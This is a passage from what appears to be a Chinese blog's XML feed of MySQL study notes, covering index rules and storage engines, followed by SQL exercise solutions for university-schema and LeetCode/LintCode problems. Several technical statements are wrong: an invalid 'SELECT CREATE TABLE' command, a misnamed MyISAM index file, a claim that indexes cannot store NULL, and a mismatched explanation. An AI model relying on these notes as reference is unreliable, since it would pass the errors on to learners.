id="索引原则">索引原则</h2><ul><li><p>数据量大，查询比较频繁的表要建立索引，对查询条件进行索引，尽量使用联合索引。</p></li><li><p>要使用区分度高的索引</p></li><li><p>字符串类型的索引，要建立前缀索引。要考虑前缀的区分度</p></li><li><p>要控制索引的效率</p></li><li><p>索引不能存储null值，建立表的时候要采用not null的约束</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 储存引擎</title>
      <link href="/2024/07/24/mysql7/"/>
      <url>/2024/07/24/mysql7/</url>
      
        <content type="html"><![CDATA[<h1>存储引擎</h1><h2 id="mysql的体系结构">mysql的体系结构</h2><p>连接层：连接的问题，授权认证的功能等</p><p>服务层：最主要的功能级别都是在这进行的</p><p>引擎层：存储的引擎，可插拔式的引擎</p><p>存储层：存储的，系统文件和日志在这一层</p><h2 id="存储引擎">存储引擎</h2><p>默认的存储引擎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CREATE TABLE EMP;</span><br></pre></td></tr></table></figure><p>RETURN:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到默认的存储引擎 Inndb</span><br></pre></td></tr></table></figure><p>创建表的时候指定存储引擎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE NAME(</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">)ENGINE = INNODB;</span><br></pre></td></tr></table></figure><p>查看当前数据库支持的存储引擎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engines;</span><br></pre></td></tr></table></figure><p>myisam早期版本的所使用的存储引擎</p><h2 id="存储引擎介绍">存储引擎介绍</h2><h3 id="innodb">innodb</h3><ul><li><p>dml操作遵循acid模型，支持事务</p></li><li><p>行级锁</p></li><li><p>支持外键</p></li></ul><p>磁盘文件：</p><ul><li>xxx.idb这是一个表空间文件，存放了表结构数据和索引的文件</li><li>参数：innodb_file_per_table，每张表都对应一个表空间文件</li></ul><p>这个文件是二进制的</p><p>可以使用指令打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibd2sdi xxxx.idb</span><br></pre></td></tr></table></figure><p>打开文件里的数据</p><p>逻辑存储结构：</p><ul><li>表空间</li><li>段</li><li>区</li><li>页</li><li>行</li></ul><p>—进行sql优化使用</p><h3 id="myisam">myisam</h3><p>不支持事务</p><p>支持锁表，不支持行锁</p><p>访问速度比较快</p><p>xxx.sdi存储表结构信息</p><p>xxx.myd存储数据</p><p>xxx.myl存储索引</p><p>可以json格式化，然后查看文件</p><h3 id="memory">memory</h3><p>存放在内存中，作为缓存或者临时表</p><p>访问速度比较快，可以实现hash索引</p><p>xxx.sdi存储表结构</p><p>没有好坏之分，根据实际情况进行选择</p><p><strong>innodb：事务的完整性，数据的一致性比较高（（（（（绝大部分，这个是默认的）））））</strong></p><p>myisam：日志，服务器评论相关的</p><p>memory:常用来作缓存，储存在内存之中，无法保证数据的安全性</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql练习</title>
      <link href="/2024/07/22/sqltest/"/>
      <url>/2024/07/22/sqltest/</url>
      
        <content type="html"><![CDATA[<h1>Mysql练习</h1><h2 id="基础题">基础题</h2><h2 id="1">1.</h2><p>从INS_SPR中选择SPR_FNM1 、SPR_SURN，其中SPR_CODE = ‘50200100’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> SPR_FNM1 , SPR_SURN <span class="keyword">FROM</span> INS_SPR <span class="keyword">WHERE</span> SPR_CODE <span class="operator">=</span> <span class="number">50200100</span>;</span><br></pre></td></tr></table></figure><p>return:</p><table><thead><tr><th>SPR_FNM1</th><th>SPR_SURN</th></tr></thead><tbody><tr><td>Tom</td><td>Cotton</td></tr></tbody></table><h2 id="2">2.</h2><p>显示学生编号为 50200100 的学生在 2016/7 TR1 学期学习的模块代码和模块名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CAM_SMO.MOD_CODE,INS_MOD.MOD_NAME</span><br><span class="line"><span class="keyword">FROM</span> INS_MOD <span class="keyword">JOIN</span> CAM_SMO <span class="keyword">ON</span> (INS_MOD.MOD_CODE<span class="operator">=</span>CAM_SMO.MOD_CODE)</span><br><span class="line"><span class="keyword">WHERE</span> CAM_SMO.SPR_CODE <span class="operator">=</span> <span class="string">&#x27;50200100&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> CAM_SMO.AYR_CODE <span class="operator">=</span> <span class="string">&#x27;2016/7&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> CAM_SMO.PSL_CODE <span class="operator">=</span> <span class="string">&#x27;TR1&#x27;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>修改代码</th><th>模组名称</th></tr></thead><tbody><tr><td>CSN08101</td><td>系统和服务</td></tr><tr><td>信息08104</td><td>数据库系统</td></tr><tr><td>SET08108</td><td>软件开发 2</td></tr></tbody></table><h2 id="3">3.</h2><p><strong>显示学生编号为 50200100 的学生在 2016/7 TR1 学期学习的模块代码、模块名称和模块负责人的详细信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CAM_SMO.MOD_CODE, INS_MOD.MOD_NAME,</span><br><span class="line">       INS_PRS.PRS_CODE, INS_PRS.PRS_FNM1, INS_PRS.PRS_SURN</span><br><span class="line">  <span class="keyword">FROM</span> CAM_SMO <span class="keyword">JOIN</span> INS_MOD <span class="keyword">ON</span> (INS_MOD.MOD_CODE<span class="operator">=</span>CAM_SMO.MOD_CODE)</span><br><span class="line">               <span class="keyword">JOIN</span> INS_PRS <span class="keyword">ON</span> (INS_MOD.PRS_CODE<span class="operator">=</span>INS_PRS.PRS_CODE)</span><br><span class="line"> <span class="keyword">WHERE</span> CAM_SMO.SPR_CODE<span class="operator">=</span><span class="string">&#x27;50200100&#x27;</span></span><br><span class="line">   <span class="keyword">AND</span> CAM_SMO.AYR_CODE<span class="operator">=</span><span class="string">&#x27;2016/7&#x27;</span></span><br><span class="line">   <span class="keyword">AND</span> CAM_SMO.PSL_CODE<span class="operator">=</span><span class="string">&#x27;TR1&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>return:</p><table><thead><tr><th>修改代码</th><th>模组名称</th><th>PRS 代码</th><th>PRS_FNM1</th><th>PRS 查询</th></tr></thead><tbody><tr><td>CSN08101</td><td>系统和服务</td><td>40000008</td><td>詹姆士</td><td>杰克逊</td></tr><tr><td>信息08104</td><td>数据库系统</td><td>40000036</td><td>安德鲁</td><td>卡明</td></tr><tr><td>SET08108</td><td>软件开发 2</td><td>40000408</td><td>尼尔</td><td>厄克特</td></tr></tbody></table><h2 id="4-力扣sql-175组合两个表">4.力扣sql 175组合两个表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select FirstName, LastName, City, State</span><br><span class="line">from Person left join Address</span><br><span class="line">on Person.PersonId = Address.PersonId</span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-leetcode-超过经理收入的员工">5.leetcode <a href="https://leetcode.cn/problems/employees-earning-more-than-their-managers/">超过经理收入的员工</a></h2><p>表：<code>Employee</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| Column Name | Type    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| id          | int     |</span><br><span class="line">| name        | varchar |</span><br><span class="line">| salary      | int     |</span><br><span class="line">| managerId   | int     |</span><br><span class="line">+-------------+---------+</span><br><span class="line">id 是该表的主键（具有唯一值的列）。</span><br><span class="line">该表的每一行都表示雇员的ID、姓名、工资和经理的ID。</span><br></pre></td></tr></table></figure><p>编写解决方案，找出收入比经理高的员工。</p><p>以 <strong>任意顺序</strong> 返回结果表。</p><p>结果格式如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">输入: </span><br><span class="line">Employee 表:</span><br><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| id | name  | salary | managerId |</span><br><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| 1  | Joe   | 70000  | 3         |</span><br><span class="line">| 2  | Henry | 80000  | 4         |</span><br><span class="line">| 3  | Sam   | 60000  | Null      |</span><br><span class="line">| 4  | Max   | 90000  | Null      |</span><br><span class="line">+----+-------+--------+-----------+</span><br><span class="line">输出: </span><br><span class="line">+----------+</span><br><span class="line">| Employee |</span><br><span class="line">+----------+</span><br><span class="line">| Joe      |</span><br><span class="line">+----------+</span><br><span class="line">解释: Joe 是唯一挣得比经理多的雇员。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题解：</span><br><span class="line">select a.Name as &#x27;Employee&#x27;</span><br><span class="line">from Employee as a,Employee as b</span><br><span class="line">where a.ManagerId = b.Id</span><br><span class="line">AND a.Salary &gt; b.Salary;</span><br></pre></td></tr></table></figure><p>这是表的自连接，通过同一张表的不同列的对比</p><p>首先的条件是</p><p>a.ManagerId = b.Id这个表明这个员工归属这个经理，然后a.Salary &gt; b.Salary;这个条件表明这个员工的工资大于他的经理</p><h2 id="6-leetcode-查找重复的电子邮箱">6.leetcode <a href="https://leetcode.cn/problems/duplicate-emails/description/">查找重复的电子邮箱</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">表: Person</span><br><span class="line"></span><br><span class="line">+-------------+---------+</span><br><span class="line">| Column Name | Type    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| id          | int     |</span><br><span class="line">| email       | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">id 是该表的主键（具有唯一值的列）。</span><br><span class="line">此表的每一行都包含一封电子邮件。电子邮件不包含大写字母。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">编写解决方案来报告所有重复的电子邮件。 请注意，可以保证电子邮件字段不为 NULL。</span><br><span class="line"></span><br><span class="line">以 任意顺序 返回结果表。</span><br><span class="line"></span><br><span class="line">结果格式如下例。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: </span><br><span class="line">Person 表:</span><br><span class="line">+----+---------+</span><br><span class="line">| id | email   |</span><br><span class="line">+----+---------+</span><br><span class="line">| 1  | a@b.com |</span><br><span class="line">| 2  | c@d.com |</span><br><span class="line">| 3  | a@b.com |</span><br><span class="line">+----+---------+</span><br><span class="line">输出: </span><br><span class="line">+---------+</span><br><span class="line">| Email   |</span><br><span class="line">+---------+</span><br><span class="line">| a@b.com |</span><br><span class="line">+---------+</span><br><span class="line">解释: a@b.com 出现了两次。</span><br></pre></td></tr></table></figure><p>题解：</p><p>第一种思路，通过条件筛选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT a.email AS &#x27;Email&#x27;</span><br><span class="line">FROM Person a, Person b</span><br><span class="line">WHERE a.email = b.email AND a.id != b.id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DISTINCT</code> 关键字用于选择不同的（不重复的）值。</p><p>使用了自连接 <code>Person a, Person b</code>。</p><p>条件 <code>a.email = b.email</code> 用于匹配相同的电子邮件。</p><p>条件 <code>a.id &lt; b.id</code> 确保每对重复的电子邮件只记录一次，避免重复。</p><p>第二种思路，使用分组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    email</span><br><span class="line">FROM</span><br><span class="line">    Person</span><br><span class="line">GROUP BY</span><br><span class="line">    email</span><br><span class="line">HAVING</span><br><span class="line">    count(email) &gt; 1</span><br></pre></td></tr></table></figure><p>使用分组直接显示出email大于一的邮箱的次数</p><h2 id="7-leetcode-删除重复的电子邮箱">7.leetcode <a href="https://leetcode.cn/problems/delete-duplicate-emails/">删除重复的电子邮箱</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">表: Person</span><br><span class="line"></span><br><span class="line">+-------------+---------+</span><br><span class="line">| Column Name | Type    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| id          | int     |</span><br><span class="line">| email       | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">id 是该表的主键列(具有唯一值的列)。</span><br><span class="line">该表的每一行包含一封电子邮件。电子邮件将不包含大写字母。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">编写解决方案 删除 所有重复的电子邮件，只保留一个具有最小 id 的唯一电子邮件。</span><br><span class="line"></span><br><span class="line">（对于 SQL 用户，请注意你应该编写一个 DELETE 语句而不是 SELECT 语句。）</span><br><span class="line"></span><br><span class="line">（对于 Pandas 用户，请注意你应该直接修改 Person 表。）</span><br><span class="line"></span><br><span class="line">运行脚本后，显示的答案是 Person 表。驱动程序将首先编译并运行您的代码片段，然后再显示 Person 表。Person 表的最终顺序 无关紧要 。</span><br><span class="line"></span><br><span class="line">返回结果格式如下示例所示。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: </span><br><span class="line">Person 表:</span><br><span class="line">+----+------------------+</span><br><span class="line">| id | email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">| 3  | john@example.com |</span><br><span class="line">+----+------------------+</span><br><span class="line">输出: </span><br><span class="line">+----+------------------+</span><br><span class="line">| id | email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">+----+------------------+</span><br><span class="line">解释: john@example.com重复两次。我们保留最小的Id = 1。</span><br></pre></td></tr></table></figure><p>题解：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> p1 <span class="keyword">FROM</span> Person p1,</span><br><span class="line">    Person p2</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    p1.Email <span class="operator">=</span> p2.Email <span class="keyword">AND</span> p1.Id <span class="operator">&gt;</span> p2.Id</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8.leetcode <a href="https://leetcode.cn/problems/rising-temperature/">上升的温度</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">表： Weather</span><br><span class="line"></span><br><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| id            | int     |</span><br><span class="line">| recordDate    | date    |</span><br><span class="line">| temperature   | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">id 是该表具有唯一值的列。</span><br><span class="line">没有具有相同 recordDate 的不同行。</span><br><span class="line">该表包含特定日期的温度信息</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">编写解决方案，找出与之前（昨天的）日期相比温度更高的所有日期的 id 。</span><br><span class="line"></span><br><span class="line">返回结果 无顺序要求 。</span><br><span class="line"></span><br><span class="line">结果格式如下例子所示。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：</span><br><span class="line">Weather 表：</span><br><span class="line">+----+------------+-------------+</span><br><span class="line">| id | recordDate | Temperature |</span><br><span class="line">+----+------------+-------------+</span><br><span class="line">| 1  | 2015-01-01 | 10          |</span><br><span class="line">| 2  | 2015-01-02 | 25          |</span><br><span class="line">| 3  | 2015-01-03 | 20          |</span><br><span class="line">| 4  | 2015-01-04 | 30          |</span><br><span class="line">+----+------------+-------------+</span><br><span class="line">输出：</span><br><span class="line">+----+</span><br><span class="line">| id |</span><br><span class="line">+----+</span><br><span class="line">| 2  |</span><br><span class="line">| 4  |</span><br><span class="line">+----+</span><br><span class="line">解释：</span><br><span class="line">2015-01-02 的温度比前一天高（10 -&gt; 25）</span><br><span class="line">2015-01-04 的温度比前一天高（20 -&gt; 30）</span><br></pre></td></tr></table></figure><p>题解：</p><p>一开始犯了个错误，直接用+1是显然不行的</p><p>去查了一遍日期函数，发现还是有不少函数可以用</p><p>索引可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT nw.id </span><br><span class="line">FROM Weather w,Weather nw</span><br><span class="line">WHERE DATEDIFF(nw.recordDate,w.recordDate)=1 </span><br><span class="line">AND w.Temperature &lt; nw.Temperature</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>思路扩展：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT w1.id</span><br><span class="line">FROM Weather w1</span><br><span class="line">JOIN Weather w2 ON w1.recordDate = DATE_ADD(w2.recordDate, INTERVAL 1 DAY)</span><br><span class="line">WHERE w1.temperature &gt; w2.temperature;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>w1.recordDate = DATE_ADD(w2.recordDate, INTERVAL 1 DAY)</p><p>使用日期函数来显示这个条件</p><h2 id="9-leetcode-游戏玩法分析-I">9.leetcode <a href="https://leetcode.cn/problems/game-play-analysis-i/">游戏玩法分析 I</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">活动表 Activity：</span><br><span class="line"></span><br><span class="line">+--------------+---------+</span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+--------------+---------+</span><br><span class="line">| player_id    | int     |</span><br><span class="line">| device_id    | int     |</span><br><span class="line">| event_date   | date    |</span><br><span class="line">| games_played | int     |</span><br><span class="line">+--------------+---------+</span><br><span class="line">在 SQL 中，表的主键是 (player_id, event_date)。</span><br><span class="line">这张表展示了一些游戏玩家在游戏平台上的行为活动。</span><br><span class="line">每行数据记录了一名玩家在退出平台之前，当天使用同一台设备登录平台后打开的游戏的数目（可能是 0 个）。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">查询每位玩家 第一次登录平台的日期。</span><br><span class="line"></span><br><span class="line">查询结果的格式如下所示：</span><br><span class="line"></span><br><span class="line">Activity 表：</span><br><span class="line">+-----------+-----------+------------+--------------+</span><br><span class="line">| player_id | device_id | event_date | games_played |</span><br><span class="line">+-----------+-----------+------------+--------------+</span><br><span class="line">| 1         | 2         | 2016-03-01 | 5            |</span><br><span class="line">| 1         | 2         | 2016-05-02 | 6            |</span><br><span class="line">| 2         | 3         | 2017-06-25 | 1            |</span><br><span class="line">| 3         | 1         | 2016-03-02 | 0            |</span><br><span class="line">| 3         | 4         | 2018-07-03 | 5            |</span><br><span class="line">+-----------+-----------+------------+--------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+-----------+-------------+</span><br><span class="line">| player_id | first_login |</span><br><span class="line">+-----------+-------------+</span><br><span class="line">| 1         | 2016-03-01  |</span><br><span class="line">| 2         | 2017-06-25  |</span><br><span class="line">| 3         | 2016-03-02  |</span><br><span class="line">+-----------+-------------+</span><br></pre></td></tr></table></figure><p>题解：</p><p>首先我是想直接多表查询，然后用id相等来确定是同一个人，然后直接a1.event_date &lt; a2.event_date就行了，但是发现这样并不能完全正确。因为这样的话就会缺少一个id=2的人，发现他只有一次</p><p>然后我就改了一版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select a1.player_id ,a1.event_date first_login from Activity a1 ,Activity a2</span><br><span class="line">where (a1.player_id = a2.player_id or (a1.player_id &lt;&gt; null and a2.player_id = null))</span><br><span class="line">and a1.event_date &lt; a2.event_date;</span><br></pre></td></tr></table></figure><p>发现这样还是缺了一部分</p><p>然后看了看题解</p><p>发现了这样一种思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select player_id, min(event_date) as first_login</span><br><span class="line">from Activity</span><br><span class="line">group by player_id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现是我想多了哈哈，这个题根本不用那么难的/(ㄒoㄒ)/~~</p><p>直接检索最小值，然后根据id分组就行了</p><h2 id="10-lintcode-整合成绩单">10.lintcode <a href="https://www.lintcode.com/problem/3616/?showListFe=true&amp;page=1&amp;problemTypeId=3&amp;pageSize=50">整合成绩单</a></h2><p>描述</p><p>现在有两张结构相同的成绩表 <code>course1_score</code> 和 <code>course2_score</code>，请编写 SQL 语句，找出两张表中都存在的学生姓名，在结果表格中通过 <code>score1</code> 列和 <code>score2</code> 列分别展示这些学生的两门课程成绩，<strong>并按照姓名的字典序进行升序排序。</strong></p><p>表定义1：<code>course1_score</code>（课程1的成绩表）</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">name</td><td style="text-align:center">varchar</td><td style="text-align:center">学生姓名</td></tr><tr><td style="text-align:center">score</td><td style="text-align:center">int</td><td style="text-align:center">课程1的成绩</td></tr></tbody></table><p>表定义2：<code>course2_score</code>（课程2的成绩表）</p><table><thead><tr><th style="text-align:center">列名</th><th style="text-align:center">类型</th><th style="text-align:center">注释</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int unsigned</td><td style="text-align:center">主键</td></tr><tr><td style="text-align:center">name</td><td style="text-align:center">varchar</td><td style="text-align:center">学生姓名</td></tr><tr><td style="text-align:center">score</td><td style="text-align:center">int</td><td style="text-align:center">课程2的成绩</td></tr></tbody></table><p>最短时间刷“透”算法面试：《66页算法宝典》.pdf</p><p>微信添加【jiuzhangfeifei】备注【66】领取</p><p>样例</p><p><strong>样例一：</strong></p><p>表内容1：<code>course1_score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">name</th><th style="text-align:center">score</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Alice</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Bob</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Chalice</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">David</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">Edward</td><td style="text-align:center">85</td></tr></tbody></table><p>表内容2：<code>course2_score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">name</th><th style="text-align:center">score</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Chalice</td><td style="text-align:center">98</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Bill</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">Alice</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Ethan</td><td style="text-align:center">85</td></tr></tbody></table><p>在运行你的 SQL 语句之后，表应返回：</p><table><thead><tr><th style="text-align:center">name</th><th style="text-align:center">score1</th><th style="text-align:center">score2</th></tr></thead><tbody><tr><td style="text-align:center">Alice</td><td style="text-align:center">100</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">Chalice</td><td style="text-align:center">95</td><td style="text-align:center">98</td></tr></tbody></table><p><strong>样例二：</strong></p><p>表内容1：<code>course1_score</code></p><table><thead><tr><th style="text-align:center">id</th><th style="text-align:center">name</th><th style="text-align:center">score</th></tr></thead><tbody><tr><td 